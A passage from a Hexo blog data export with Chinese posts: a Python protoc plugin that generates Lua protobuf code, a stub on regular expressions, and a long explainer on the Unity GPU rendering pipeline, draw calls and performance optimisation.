parent\n            self.filename = filename\n            self.package = package\n            if parent:\n                self.parent.add_child(self)\n            self.name = name\n\n        def add_child(self, child):\n            self.child.append(child)\n\n        def find_child(self, child_names):\n            if child_names:\n                for i in self.child:\n                    if i.name == child_names[0]:\n                        return i.find_child(child_names[1:])\n                raise StandardError\n            else:\n                return self\n\n        def get_child(self, child_name):\n            for i in self.child:\n                if i.name == child_name:\n                    return i\n            return None\n\n        def get_path(self, end = None):\n            pos = self\n            out = []\n            while pos and pos != end:\n                out.append(pos.name)\n                pos = pos.parent\n            out.reverse()\n            return &#39;.&#39;.join(out)\n\n        def get_global_name(self):\n            return self.get_path()\n\n        def get_local_name(self):\n            pos = self\n            while pos.parent:\n                pos = pos.parent\n                if self.package and pos.name == self.package[-1]:\n                    break\n            return self.get_path(pos)\n\n        def __str__(self):\n            return self.to_string(0)\n\n        def __repr__(self):\n            return str(self)\n\n        def to_string(self, indent = 0):\n            return &#39; &#39;*indent + &#39;&lt;TreeNode &#39; + self.name + &#39;(\\n&#39; + \\\n                    &#39;,&#39;.join([i.to_string(indent + 4) for i in self.child]) + \\\n                    &#39; &#39;*indent +&#39;)&gt;\\n&#39;\n\n    class Env(object):\n        filename = None\n        package = None\n        extend = None\n        descriptor = None\n        message = None\n        context = None\n        register = None\n        def __init__(self):\n            self.message_tree = TreeNode(&#39;&#39;)\n            self.scope = self.message_tree\n\n        def get_global_name(self):\n            return self.scope.get_global_name()\n\n        def get_local_name(self):\n            return self.scope.get_local_name()\n\n        def get_ref_name(self, type_name):\n            try:\n                node = self.lookup_name(type_name)\n            except:\n                # if the child doesn&#39;t be founded, it must be in this file\n                return type_name[len(&#39;.&#39;.join(self.package)) + 1:]\n            if node.filename != self.filename:\n                return node.filename + &#39;_pb.&#39; + node.get_local_name()\n            return node.get_local_name()\n\n        def lookup_name(self, name):\n            names = name.split(&#39;.&#39;)\n            if names[0] == &#39;&#39;:\n                return self.message_tree.find_child(names[1:])\n            else:\n                return self.scope.parent.find_child(names)\n\n        def enter_package(self, package):\n            if not package:\n                return self.message_tree\n            names = package.split(&#39;.&#39;)\n            pos = self.message_tree\n            for i, name in enumerate(names):\n                new_pos = pos.get_child(name)\n                if new_pos:\n                    pos = new_pos\n                else:\n                    return self._build_nodes(pos, names[i:])\n            return pos\n\n        def enter_file(self, filename, package):\n            self.filename = filename\n            self.package = package.split(&#39;.&#39;)\n            self._init_field()\n            self.scope = self.enter_package(package)\n\n        def exit_file(self):\n            self._init_field()\n            self.filename = None\n            self.package = []\n            self.scope = self.scope.parent\n\n        def enter(self, message_name):\n            self.scope = TreeNode(message_name, self.scope, self.filename,\n                                self.package)\n\n        def exit(self):\n            self.scope = self.scope.parent\n\n        def _init_field(self):\n            self.descriptor = []\n            self.context = []\n            self.message = []\n            self.register = []\n\n        def _build_nodes(self, node, names):\n            parent = node\n            for i in names:\n                parent = TreeNode(i, parent, self.filename, self.package)\n            return parent\n\n    class Writer(object):\n        def __init__(self, prefix=None):\n            self.io = StringIO()\n            self.__indent = &#39;&#39;\n            self.__prefix = prefix\n\n        def getvalue(self):\n            return self.io.getvalue()\n\n        def __enter__(self):\n            self.__indent += &#39;    &#39;\n            return self\n\n        def __exit__(self, type, value, trackback):\n            self.__indent = self.__indent[:-4]\n\n        def __call__(self, data):\n            self.io.write(self.__indent)\n            if self.__prefix:\n                self.io.write(self.__prefix)\n            self.io.write(data)\n\n    DEFAULT_VALUE = {\n        FDP.TYPE_DOUBLE         : &#39;0.0&#39;,\n        FDP.TYPE_FLOAT          : &#39;0.0&#39;,\n        FDP.TYPE_INT64          : &#39;0&#39;,\n        FDP.TYPE_UINT64         : &#39;0&#39;,\n        FDP.TYPE_INT32          : &#39;0&#39;,\n        FDP.TYPE_FIXED64        : &#39;0&#39;,\n        FDP.TYPE_FIXED32        : &#39;0&#39;,\n        FDP.TYPE_BOOL           : &#39;false&#39;,\n        FDP.TYPE_STRING         : &#39;&quot;&quot;&#39;,\n        FDP.TYPE_MESSAGE        : &#39;nil&#39;,\n        FDP.TYPE_BYTES          : &#39;&quot;&quot;&#39;,\n        FDP.TYPE_UINT32         : &#39;0&#39;,\n        FDP.TYPE_ENUM           : &#39;1&#39;,\n        FDP.TYPE_SFIXED32       : &#39;0&#39;,\n        FDP.TYPE_SFIXED64       : &#39;0&#39;,\n        FDP.TYPE_SINT32         : &#39;0&#39;,\n        FDP.TYPE_SINT64         : &#39;0&#39;,\n    }\n\n    def code_gen_enum_item(index, enum_value, env):\n        full_name = env.get_local_name() + &#39;.&#39; + enum_value.name\n        obj_name = full_name.upper().replace(&#39;.&#39;, &#39;_&#39;) + &#39;_ENUM&#39;\n        env.descriptor.append(\n            &quot;local %s = protobuf.EnumValueDescriptor();\\n&quot;% obj_name\n        )\n\n        context = Writer(obj_name)\n        context(&#39;.name = &quot;%s&quot;\\n&#39; % enum_value.name)\n        context(&#39;.index = %d\\n&#39; % index)\n        context(&#39;.number = %d\\n&#39; % enum_value.number)\n\n        env.context.append(context.getvalue())\n        return obj_name\n\n    def code_gen_enum(enum_desc, env):\n        env.enter(enum_desc.name)\n        full_name = env.get_local_name()\n        obj_name = full_name.upper().replace(&#39;.&#39;, &#39;_&#39;)\n        env.descriptor.append(\n            &quot;local %s = protobuf.EnumDescriptor();\\n&quot;% obj_name\n        )\n\n        context = Writer(obj_name)\n        context(&#39;.name = &quot;%s&quot;\\n&#39; % enum_desc.name)\n        context(&#39;.full_name = &quot;%s&quot;\\n&#39; % env.get_global_name())\n\n        values = []\n        for i, enum_value in enumerate(enum_desc.value):\n            values.append(code_gen_enum_item(i, enum_value, env))\n        context(&#39;.values = {%s}\\n&#39; % &#39;,&#39;.join(values))\n\n        env.context.append(context.getvalue())\n        env.exit()\n        return obj_name\n\n    def code_gen_field(index, field_desc, env):\n        full_name = env.get_local_name() + &#39;.&#39; + field_desc.name\n        obj_name = full_name.upper().replace(&#39;.&#39;, &#39;_&#39;) + &#39;_FIELD&#39;\n        env.descriptor.append(\n            &quot;local %s = protobuf.FieldDescriptor();\\n&quot;% obj_name\n        )\n\n        context = Writer(obj_name)\n\n        context(&#39;.name = &quot;%s&quot;\\n&#39; % field_desc.name)\n        context(&#39;.full_name = &quot;%s&quot;\\n&#39; % (\n            env.get_global_name() + &#39;.&#39; + field_desc.name))\n        context(&#39;.number = %d\\n&#39; % field_desc.number)\n        context(&#39;.index = %d\\n&#39; % index)\n        context(&#39;.label = %d\\n&#39; % field_desc.label)\n\n        if field_desc.HasField(&quot;default_value&quot;):\n            context(&#39;.has_default_value = true\\n&#39;)\n            value = field_desc.default_value\n            if field_desc.type == FDP.TYPE_STRING:\n                context(&#39;.default_value = &quot;%s&quot;\\n&#39;%value)\n            else:\n                context(&#39;.default_value = %s\\n&#39;%value)\n        else:\n            context(&#39;.has_default_value = false\\n&#39;)\n            if field_desc.label == FDP.LABEL_REPEATED:\n                default_value = &quot;{}&quot;\n            elif field_desc.HasField(&#39;type_name&#39;):\n                default_value = &quot;nil&quot;\n            else:\n                default_value = DEFAULT_VALUE[field_desc.type]\n            context(&#39;.default_value = %s\\n&#39; % default_value)\n\n        if field_desc.HasField(&#39;type_name&#39;):\n            type_name = env.get_ref_name(field_desc.type_name).upper().replace(&#39;.&#39;, &#39;_&#39;)\n            if field_desc.type == FDP.TYPE_MESSAGE:\n                context(&#39;.message_type = %s\\n&#39; % type_name)\n            else:\n                context(&#39;.enum_type = %s\\n&#39; % type_name)\n\n        if field_desc.HasField(&#39;extendee&#39;):\n            type_name = env.get_ref_name(field_desc.extendee)\n            env.register.append(\n                &quot;%s.RegisterExtension(%s)\\n&quot; % (type_name, obj_name)\n            )\n\n        context(&#39;.type = %d\\n&#39; % field_desc.type)\n        context(&#39;.cpp_type = %d\\n\\n&#39; % CPP_TYPE[field_desc.type])\n        env.context.append(context.getvalue())\n        return obj_name\n\n    def code_gen_message(message_descriptor, env, containing_type = None):\n        env.enter(message_descriptor.name)\n        full_name = env.get_local_name()\n        obj_name = full_name.upper().replace(&#39;.&#39;, &#39;_&#39;)\n        env.descriptor.append(\n            &quot;local %s = protobuf.Descriptor();\\n&quot;% obj_name\n        )\n\n        context = Writer(obj_name)\n        context(&#39;.name = &quot;%s&quot;\\n&#39; % message_descriptor.name)\n        context(&#39;.full_name = &quot;%s&quot;\\n&#39; % env.get_global_name())\n\n        nested_types = []\n        for msg_desc in message_descriptor.nested_type:\n            msg_name = code_gen_message(msg_desc, env, obj_name)\n            nested_types.append(msg_name)\n        context(&#39;.nested_types = {%s}\\n&#39; % &#39;, &#39;.join(nested_types))\n\n        enums = []\n        for enum_desc in message_descriptor.enum_type:\n            enums.append(code_gen_enum(enum_desc, env))\n        context(&#39;.enum_types = {%s}\\n&#39; % &#39;, &#39;.join(enums))\n\n        fields = []\n        for i, field_desc in enumerate(message_descriptor.field):\n            fields.append(code_gen_field(i, field_desc, env))\n\n        context(&#39;.fields = {%s}\\n&#39; % &#39;, &#39;.join(fields))\n        if len(message_descriptor.extension_range) &gt; 0:\n            context(&#39;.is_extendable = true\\n&#39;)\n        else:\n            context(&#39;.is_extendable = false\\n&#39;)\n\n        extensions = []\n        for i, field_desc in enumerate(message_descriptor.extension):\n            extensions.append(code_gen_field(i, field_desc, env))\n        context(&#39;.extensions = {%s}\\n&#39; % &#39;, &#39;.join(extensions))\n\n        if containing_type:\n            context(&#39;.containing_type = %s\\n&#39; % containing_type)\n\n        env.message.append(&#39;%s = protobuf.Message(%s)\\n&#39; % (full_name,\n                                                            obj_name))\n\n        env.context.append(context.getvalue())\n        env.exit()\n\n        # print(&#39;\\n&#39;+str(env.descriptor)+&quot;\\n&quot;)\n        # print(&#39;\\n&#39;+str(env.context)+&quot;\\n&quot;)\n        # print(&#39;\\n&#39;+str(env.message)+&quot;\\n&quot;)\n        # print(&#39;\\n&#39;+str(env.register)+&quot;\\n&quot;)\n        # print(&#39;\\n&#39;+str(env.filename)+&quot;\\n&quot;)\n        return obj_name\n\n    def write_header(writer):\n        writer(&quot;&quot;&quot;-- Generated By protoc-gen-lua Do not Edit\n    &quot;&quot;&quot;)\n\n    def code_gen_file(proto_file, env, is_gen):\n        filename = path.splitext(proto_file.name)[0]\n        env.enter_file(filename, proto_file.package)\n\n        includes = []\n        for f in proto_file.dependency:\n            inc_file = path.splitext(f)[0]\n            includes.append(inc_file)\n\n    #    for field_desc in proto_file.extension:\n    #        code_gen_extensions(field_desc, field_desc.name, env)\n\n        for enum_desc in proto_file.enum_type:\n            code_gen_enum(enum_desc, env)\n            for enum_value in enum_desc.value:\n                env.message.append(&#39;%s = %d\\n&#39; % (enum_value.name,\n                                                enum_value.number))\n\n        for msg_desc in proto_file.message_type:\n            code_gen_message(msg_desc, env)\n\n        if is_gen:\n            lua = Writer()\n            write_header(lua)\n            lua(&#39;local protobuf = require &quot;protobuf&quot;\\n&#39;)\n            for i in includes:\n                lua(&#39;local %s_pb = require(&quot;%s_pb&quot;)\\n&#39; % (i, i))\n            lua(&quot;module(&#39;%s_pb&#39;)\\n&quot; % env.filename)\n\n            lua(&#39;\\n\\n&#39;)\n            for des in env.descriptor:\n                lua(des)\n            lua(&#39;\\n&#39;)\n            for con in env.context:\n                lua(con)\n            lua(&#39;\\n&#39;)\n            env.message.sort()\n            for msg in env.message:\n                lua(msg)\n            lua(&#39;\\n&#39;)\n            for reg in env.register:\n                lua(reg)\n\n            # print(&#39;\\n&#39;+str(env.descriptor)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(env.context)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(env.message)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(env.register)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(env.filename)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(lua.getvalue())+&quot;\\n&quot;)\n\n            _files[env.filename+ &#39;_pb.lua&#39;] = lua.getvalue()\n        env.exit_file()\n\n    def main():\n        plugin_require_bin = sys.stdin.buffer.read()\n        # print(plugin_require_bin.decode(&quot;utf-8&quot;,&quot;ignore&quot;))\n        code_gen_req = plugin_pb2.CodeGeneratorRequest()\n        code_gen_req.ParseFromString(plugin_require_bin)\n\n        env = Env()\n        for proto_file in code_gen_req.proto_file:\n            code_gen_file(proto_file, env,\n                    proto_file.name in code_gen_req.file_to_generate)\n\n        code_generated = plugin_pb2.CodeGeneratorResponse()\n        for k in  _files:\n            file_desc = code_generated.file.add()\n            file_desc.name = k\n            file_desc.content = _files[k]\n\n        sys.stdout.buffer.write(code_generated.SerializeToString())\n        for k in  _files:\n            try:\n                with open(r&quot;xxx/protoc-gen-lua-master/protobuf/luascript/&quot; + k, &quot;w+&quot;) as lua_file:\n                    lua_file.write(_files[k])\n                # print(&quot;输出protocol-lua:&quot;, k, &quot;正常&quot;)                \n            except Exception as e:\n                # print(&quot;输出lua报错,请检查&quot;)\n                print(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;,str(e))\n\n\n    if __name__ == &quot;__main__&quot;:\n        main()\n\n\n\n</code></pre><ul>\n<li>5.按照protoc-gen-lua-master文件中的解释,进行build文件,成功生成 xxx_pb.lua文件</li>\n</ul>\n"},{"title":"正则表达式","date":"2020-05-08T03:41:32.000Z","_content":"\n# 正则表达式\n学习正则表达式\n","source":"_posts/RegularExpression/RegularExpression.md","raw":"---\ntitle: 正则表达式\ndate: 2020-05-08 11:41:32\ncategories:\n- 正则表达式\ntags: \n- re\n---\n\n# 正则表达式\n学习正则表达式\n","slug":"RegularExpression/RegularExpression","published":1,"updated":"2020-05-15T02:55:07.718Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cy7000w2gk77mvtftze","content":"<h1 id=\"正则表达式\"><a href=\"#正则表达式\" class=\"headerlink\" title=\"正则表达式\"></a>正则表达式</h1><p>学习正则表达式</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"正则表达式\"><a href=\"#正则表达式\" class=\"headerlink\" title=\"正则表达式\"></a>正则表达式</h1><p>学习正则表达式</p>\n"},{"title":"渲染基本流程","date":"2020-05-08T03:41:32.000Z","_content":"\n# 基本流程\n* 开发准备流程\n> * 1:搭建场景,添加摄像机,添加光源,设置摄像机,设置光源.\n> * 2:剔除无需渲染的物体,包括不限于 2D 物体,3D 物体 \n> * 3:设置物体的渲染状态,包括不限于设置材质,纹理,shader 等\n\n\n* 电脑 CPU 运行流程\n> * 1:准备数据,上面开发准备流程最后会在CPU中生成几何信息,一般叫做\"渲染图元\",几何信息就是 点,线,面 的数据.会将这些数据加载到系统内存(Random Access Memory,RAM).在 Unity3d 对应的类是 Mesh\n> * 2:准备数据,将设置的渲染状态也读进内存中.渲染状态定义了场景内的网格是怎样被渲染的.比如:设置顶点着色器/片元着色器,光源,材质,纹理等,动态修改渲染状态等.在 Unity3d 对应的类是 MeshRenderer\n> * 3:CPU 向 GPU 发送 DrawCall 命令,开始渲染.这个命令指向一个等待被渲染的图元列表(就是点线面数据,不包含渲染状态).GPU 会拿到渲染状态和图元列表进行渲染成像.在 Unity3d 里面被隐藏了细节,无法看到\n> * 其他知识:一般情况下,DrawCall命令,不应该频繁,unity 官方设定固定时间内 250 个以下.DrawCall命令指向的图元列表不应该过多,这个也是应该注意的.\n\n\n* 电脑GPU运行流程\n> * -->A:GPU 将对这些几何数据进行处理,会输出下一个阶段需要的信息.比如会将顶点坐标转换到屏幕空间中,输出一些二维顶点坐标,每个顶点对应的深度值,着色等信息.一般叫做\"几何阶段\",开启几何阶段\n>> * -->1:顶点着色器.(由顶点数据传入,传出顶点数据,这些数据可能被增加或者被删减).\n>> * -->2:曲面细分着色器\n>> * -->3:几何着色器\n>> * -->4:裁剪\n>> * -->5:屏幕映射\n> * -->B:将上一阶段生成的数据,用来生产屏幕上的像素,渲染出最终的图像.一般叫做\"光栅化阶段\",开启光栅化阶段\n>> * -->1:三角形设置\n>> * -->2:三角形遍历\n>> * -->3:片元着色器\n>> * -->4:逐片元操作\n> * -->C:生成最终的屏幕2D图像\n> * 其他知识:一般情况下,网格和纹理等数据会被加载到显卡上的存储空间,显存(Video Random Access Memory,VRAM),这是由于在显存上面读取数据比在内存读取数据渲染更快.\n\n\n# GPU渲染流程\n\n\n* 顶点数据-->顶点着色器-->曲面细分着色器-->几何着色器-->裁剪-->屏幕映射-->三角形设置-->三角形遍历-->片元着色器-->逐片元操作-->屏幕2D图像,屏幕 2d 图像也是可以表示三维立体感受的(主要靠脑补).\n> * A:开启几何阶段\n> * 1:顶点着色器(Vertex Shader)是完全可编程的,通常用于实现顶点的控件变换,顶点着色,坐标变换,逐顶点光照,后续阶段的数据等功能.输入进来的每个顶点都会调用一次顶点着色器,不可以创建或者销毁顶点,无法得到顶点与顶点之间的关系.(无法得知2 个顶点是否属于同一个三角网络),这样情况下,GPU 可以并行处理很多个顶点.必须完成的工作    \n> ***把顶点坐标从模型空间(本身空间)转换到齐次裁剪空间***        \n> 就是将一个三维坐标系中的点,变为一个立体正方形中的一个点,由硬件做透视除法之后,得到最终的归一化设备坐标(Normalized Device Coordinates,NDC)\n> ```\n>    o.pos = mul(UNITY_MVP,v.position);\n>    UnityObjectToClipPos(v.vertex);\n> ```\n> * 2:曲面细分着色器(Tessellation Shader)是一个可选的着色器,它用于细分图元.\n> * 3:几何着色器(Geometry Shader)同样是一个可选的着色器,它可以被用于执行逐图元的着色操作,或者被用于产生更多的图元.\n> * 4:裁剪(Clipping),这一阶段的目的是将那些不在摄像机视野内的顶点裁剪掉,并剔除某些三角图元的面片.这个阶段可以配置,不可以编程,比如:可以使用自定义的裁剪平面来配置裁剪区域,也可以通过指令控制裁剪三角图元的正面还是背面.     \n一个图元和摄像机视野的关系有 3 种,完全在视野内,部分在视野内,完全在视野外.部分在视野内的物体需要被裁剪.即在齐次裁剪空间里面,所有的顶点都被放入这个立方体内了,不在立方体内的映射,直接被裁剪掉,不会被渲染.\n> * 5:屏幕映射(Screen Mapping),不可以编程和配置,负责把每个图元的坐标转换到屏幕坐标系中.作用是从齐次裁剪的立方体内将三维坐标系x,y,z --> 变成二维坐标的 x,y.      \n这个地方需要理解屏幕坐标系(Screen Coordinates),这个是纯二维坐标系,对应的是立方体内的 x,y,那么 z 值跑哪里了?     \n屏幕坐标系和 z 坐标构成了窗口坐标系(Window Coordinates),z值参与了GPU的光栅化阶段.窗口里面的内容可以让人眼有明显的三维立体感受,而屏幕坐标系没有三维立体感受.z值参与了表示在三维立体感受中的物体距离屏幕坐标系有多远,也就是一个点距离一个面有多远,这个需要想象力\n> * B:开启光栅化阶段,接收上个阶段输出的数据(例如屏幕坐标系下的顶点位置,深度值(z坐标),法线方向,视角方向等数据),概览:计算每个图元覆盖了屏幕二维坐标系的哪些像素,以及为这些像素计算它们的颜色\n> * 6:三角形设置(Triangle Setup):固定函数,不可编程与配置.上个阶段我们得到的都是三角网格的顶点,即我们得到的是三角形的每条边的 2 个端点,根据这些数据计算三角形每条边的像素坐标,从而知道三角网格对像素的覆盖情况.       \n> * 7:三角形遍历(Triangle Traversal):固定函数,不可编程与配置.检查每个像素是否被一个三角网格所覆盖,如果这个像素被覆盖,就生成一个片元(fragment)对象.找到哪些像素被三角网格覆盖的过程就是三角形遍历,这个阶段也被称为扫描变换(Scan Conversion).     \n寻找过程中,会对整个覆盖区域的像素进行插值计算,得出深度值,最终输出一个片元对象.      \n片元对象不是像素,是数据的集合,包括屏幕坐标,深度信息,顶点信息,法线,颜色,纹理坐标uv等等.\n> * 8:片元着色器(Fragment Shader),完全可配置与编程.用于实现逐片元的着色操作.在DirectX中,被称为像素着色器(Pixel Shader).        \n得到的一些数据,是根据从顶点着色器中输出的数据插值得到的,最终输出是一个或者多个颜色值.       \n程序开发会修改插值得到的颜色,将顶点着色器输出的纹理坐标,对应片元的纹理坐标,进行颜色的修改等.\n> * 9:逐片元操作(Per-Fragment Operations),可配置,负责修改颜色,深度缓冲,混合等等.在DirectX中,被称为输出合并阶段(Output-Merger)).         \n主要工作是:     \n1):决定每个片元的可见性,深度测试(Depth Test),模板测试(Stencil Test),如果不通过测试,则放弃这个片元,测试的含义类似于闯关.这个地方的测试尤其重要.        \n模板测试-->拿到颜色缓冲区的参考值-->对比片元的参考值-->舍弃或者写入颜色缓冲区       \n深度测试-->拿到颜色缓冲区的深度值-->对比片元的深度值-->舍弃或者进入下一步-->是否开启深度写入-->舍弃或者写入颜色缓冲区        \n2):当你闯关成功,就会把片元的颜色值和已经存储在颜色缓冲区中的颜色进行合并,或者说是混合.      \n3)混合之后的颜色,写入颜色缓冲区中,当你进行渲染的时候,颜色缓冲区中已经有数据了,这次的颜色数据是覆盖颜色缓冲区的数据,还是进行合并融合,就是这一步需要做的事情.     \n4)为了避免我们看到正在进行光栅化的图元,GPU 使用了双重缓冲,前置缓冲区和后置缓冲区来回进行交换,因此保证了我们看到的图像总是连续的\n* 注意上面讲到的顺序,在不同平台可能排列不一致,这是因为图像编程的实现不太相同,也可能是GPU 做了很多优化.      \n\n# GPU渲染过程中的空间变换过程\n* 1:模型空间(model space),对象空间(object space)或者局部空间(local space),使用的左手坐标系,都表示当前你这个物体在自身坐标系下的空间.\n* 2:世界空间(world space)就是 global 空间,使用的左手坐标系,它建立了我们想象中的无限大空间,但是在程序中,是有限的,有界的.这个空间在我们正常交流中,可以指一个办公室,一座大楼,一座农场等等,它们才是玩家所能达到最大的场景,这叫做世界空间,也就是说一个办公室,一座大楼,一座农场就是世界空间.要理解这个,真的靠想象力.        \n世界空间的原点,就是游戏空间的中心点.我们可以把 unity 想象成一个树状图结构,有一个虚拟的根节点,根节点下有多个场景(在 Scenes In Build 中有很多可以打包的场景),这些场景又是一个节点,这个场景节点下面又有很多物体,就放在 Hierarchy 下面,可以把GameObject 的父节点认为是当前的这个场景.在Hierarchy 下面第一层的GameObject就是世界空间,第二层以及以后才是模型空间.       \n***第一步变换:将顶点坐标从模型空间变换到世界空间,叫做模型变换***\n* 3:观察空间(view space)也被成为摄像机空间(camera space),模型空间中的特殊空间,使用的右手坐标系,这是一个三维空间.而屏幕空间是一个二维空间,采用的是人的脑补才出现的三维空间.      \n***第二步变换:将顶点坐标从世界空间变换到观察空间,叫做观察变换***\n*  4:裁剪空间(clip space)也被称为齐次裁剪空间,使用的矩阵叫做裁剪矩阵(clip matrix),也叫做投影矩阵(projection matrix),作用是对渲染图元进行裁剪,位于空间内部的图元会被保留,位于外部的被剔除,与这块空间边界相交的图元会被裁剪,这块空间由摄像机的视椎体决定.视椎体有 6 个平面,被称为裁剪平面(clip plans).     \n***第三步变换:将顶点坐标从观察空间变换到裁剪空间,叫做裁剪变换***\n*  5:屏幕空间(screen space)需要经过真正的投影.需要进行标准齐次除法(homogeneous division),在 openGL 中被称为归一化设备坐标(Normalized Device Coordinates,NDC),经过这个步骤之后,裁剪空间变成了立方体空间,之前是梯形空间.通过映射算法,直接映射在屏幕上面. \n***第四步变换:将顶点坐标从裁剪空间映射到屏幕空间***\n* 6:总结,       \n模型空间--->模型变换--->世界空间--->观察变换--->观察空间--->投影变换--->裁剪空间--->屏幕映射--->屏幕空间       \n将模型变换,观察变换以及投影变换串联成一个矩阵,即 MVP 矩阵,用于将顶点从模型空间中转换到裁剪空间中.\n\n\n# Draw Call \n* 1:draw call 本身的含义很简单.就是 CPU 调用图像编程接口,命令 GPU 进行渲染的操作.接口命令的例子:OpenGL 中的 glDrawElements 命令或者 DirectX 中的 DrawIndexedPrimitive 命令.\n* 2:我们需要让 CPU 以及 GPU 并行工作,以提高效率,就产生了一个命令缓冲区(Command Buffer).命令缓冲区包含了一个命令队列,由 CPU 向里面添加命令,GPU 从中读取命令,添加和读取的过程是相互独立的.先进先出模式,CPU 生产,GPU 消费.\n* 3:命令缓冲区里面不止draw call一种命令,还有改变渲染状态的命令(更加耗时).\n* 4:如果频繁调用 draw call,CPU就会向 GPU 发送很多内容,包括数据,状态和命令,检查渲染状态等.如果draw call太多,CPU 就会花费大量时间在上面,造成 CPU 过载,影响帧率.\n* 5:优化draw call,就是将相同渲染状态的网格,合并成一个大的网格,提交一次即可.这就是批处理(Batching)的方法.一般情况下静态批处理很好做,动态批处理也会合并,但是因为物体是在不断运动的,所以每帧都会有合批,这对 CPU 是一种压榨性能的操作.避免使用大量很小的网格,非要用,考虑合批.尽量使用相同的材质(同一渲染状态).\n\n# 渲染优化\n* 影响性能的因素有哪些?\n> **A**:CPU 中过多的 draw call ,复杂的脚本或者物理模拟      \n> **B**:GPU 顶点处理:过多的顶点,过多的逐顶点计算.片元处理,过多的片元(即可能是由于分辨率造成的,也可能是由于 overdraw 造成的),过多的逐片元计算.       \n> **C**:带宽,也就是 CPU 向 GPU 提交 draw call 命令携带的数据需要一个通道送给 GPU,这条通道就是带宽.CPU 在每次通知 GPU 进行渲染之前,都需要提前准备好顶点数据(如:位置,法线,颜色,纹理坐标等),然后调用一系列 API 把它们放到 GPU 可以访问到的指定位置,最后,调用一个绘制命令(会改变很多渲染状态的设置),来告诉 GPU 进行渲染.调用时会产生一个 draw call ,过多的 draw call 或者 一次 draw call 的数据量过大,都会导致 CPU 将大部分时间都花费在提交 draw call 的工作上面.       \n> **D**:填充率, 降低显示分辨率并运行游戏。如果较低的显示分辨率使游戏运行得更快，你可能会受到GPU填充率的限制。       \n* 优化手段\n> 1:CPU 使用(动态,静态)批处理降低 draw call     \n> 2:GPU 让美术同学降低顶点,有时候 GPU 会将一个顶点拆成多个顶点,原因是分离纹理坐标(uv splits)或者产生平滑的边界(smoothing splits),优化建议:尽可能移除不必要的硬边以及纹理衔接,避免边界平滑和纹理分离.减少模型面数,使用 LOD 技术减少顶点数,模型离摄像机很远时,减少模型上面的面数.        \n> 3:GPU 程序方面减少需要处理的顶点数目,优化几何体,使用模型的 LOD(Level of Detail)技术.使用遮挡剔除(Occlusion Culling)技术       \n> 4:减少需要处理的片元数目,在于减少overdraw,就是同一个像素被绘制了多次.控制绘制程序,避免使用半透明队列,时刻警惕透明物体,减少实时光照.      \n> 5:在 shader 中减少计算复杂度,不要使用 分支语句与循环语句,避免使用 sin,tan,pow,log 等数学运算,使用查找表来作为代替,不要使用 discard 操作.使用 Shader 的 LOD(Level of Detail)技术,只有 shader 的 LOD 值小于某个设定的值,这个 shader 才会被使用,而使用了那些超过设定值的 shader 的物体将不会被渲染.       \n> 6:图片设置,减小纹理大小,尽量小于 1024x1024,长宽值最好是 2 的整数幂.       \n> 7:使用 渲染统计窗口 Rendering Statistics Window,性能分析器(Profiler),以及帧调试器(Frame Debugger)     \n* 用好工具\n> 1:渲染统计窗口 Rendering Statistics Window\n>> Graphic 的右侧显示了 FPS 数目以及毫秒数.毫秒数表示处理和渲染一帧所需的时间.FPS 表示一段时间内的平均值。平均 FPS = 帧数 / 一段时长。帧数可以用每次进入 Update 时加一的变量来统计。一段时长就是进入 Update 时 Time.deltaTime 的累加因为是平均值，所以当时间越长时，这个值才是稳定的。一般情况是在 Update 记录时长与调用次数,用调用次数/记录时长=FPS,如果记录时长=1秒则表示每秒多少帧.每秒 60 帧是非常好的,现在手游基本保持在每秒 30 帧以上的标准.用记录时长 * 1000 表示毫秒数,记录时长 * 1000 / 调用次数,表示多少毫秒每帧.如果记录时长=1秒,则一帧所用时长为 1000 / 调用次数 毫秒.稳定情况下 16.6ms一帧 是非常好的,不需要优化的,如果达到了 33ms每帧 则需要进行优化了.因为 33ms每帧 则一秒才有30帧,显然是需要优化的.(https://www.freesion.com/article/1005726774/)               \n>> batches 一帧中需要进行批处理的数目,官方建议低于 250 个.      \n>>Saved By Batching 合并的批处理数目,这个数字表明了批处理为我们节省了多少 Draw Call     \n>> Tris 和 Verts 表示需要绘制的三角面片(官方建议在手机上低于200K面)与顶点数目(官方建议在手机上低于100K 个顶点)       \n>> Screen 屏幕的大小以及它占用的内存大小        \n>> SetPass 渲染使用的 Pass 的数目,每个 Pass 都需要 Unity 的 runtime 来绑定一个新的 shader ,这可能造成 CPU 的瓶颈        \n>> Visible Skinned Meshes 渲染蒙皮网格的数目        \n>> Animations 播放的动画数目        \n\n> 2: 性能分析器(Profiler)\n>> Rendering 里面展示了很详细的信息.        \n\n> 3:帧调试器(Frame Debugger)\n>>可以得到 unity 是如何渲染当前帧的\n* 批处理\n> 1:静态批处理:自由度高,限制很少,需要共享同一材质.缺点是占用更多的内存,经过静态批处理的物体都不可以移动了,即时在脚本里面尝试改变物体的位置.如果在静态批处理前一些物体共享了相同的网格,那么再内存中每一个物体都会对应一个该网格的复制品,即一个网格会变成多个网格再发送给 GPU,如果有 1000 个相同网格的模型,就会多出 1000 倍的内存.在内存上面 VBO total 会变大.\n\n> 2:动态批处理:优点是一切处理都是 unity 自动完成的,不需要我们自己做任何操作,而且物体是可以移动的,但缺点是限制很多,需要相同的渲染状态,CPU 压力大.原理是每一帧把可以进行批处理的模型网格进行合并,再把合并后的模型数据传递给 GPU,然后使用同一个材质对齐渲染,因为是每帧都在合并,所以物体可以移动.要保证相同材质,相同 shader,相同缩放,相同顶点.测试:在一个空场景把所有运动的模型导入,让其运动,然后测试 draw call 是否是一个,Save By Baching 的数目是否大于 0,这种就是动态合批了.\n","source":"_posts/Renderer/渲染基本流程.md","raw":"---\ntitle: 渲染基本流程\ndate: 2020-05-08 11:41:32\ncategories:\n-  Renderer\ntags:\n- Renderer\n---\n\n# 基本流程\n* 开发准备流程\n> * 1:搭建场景,添加摄像机,添加光源,设置摄像机,设置光源.\n> * 2:剔除无需渲染的物体,包括不限于 2D 物体,3D 物体 \n> * 3:设置物体的渲染状态,包括不限于设置材质,纹理,shader 等\n\n\n* 电脑 CPU 运行流程\n> * 1:准备数据,上面开发准备流程最后会在CPU中生成几何信息,一般叫做\"渲染图元\",几何信息就是 点,线,面 